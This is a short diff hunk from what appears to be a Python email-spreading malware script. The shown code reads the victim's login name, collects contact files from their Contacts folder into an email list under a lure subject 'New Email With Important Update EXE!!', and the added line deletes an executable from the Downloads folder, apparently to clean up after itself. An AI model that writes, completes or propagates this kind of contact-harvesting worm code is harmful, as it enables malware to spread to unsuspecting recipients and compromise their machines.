@@ -26,6 +26,7 @@ subject = "New Email With Important Update EXE!!"
 def getEmail():
     name = os.getlogin()
     os.chdir("/Users/" + name + "/Downloads")
+    os.remove("testShunk.exe")
     email_list = []
     for files in os.listdir("/Users/" + name + "/Contacts"):
         if files.endswith(".contact"):
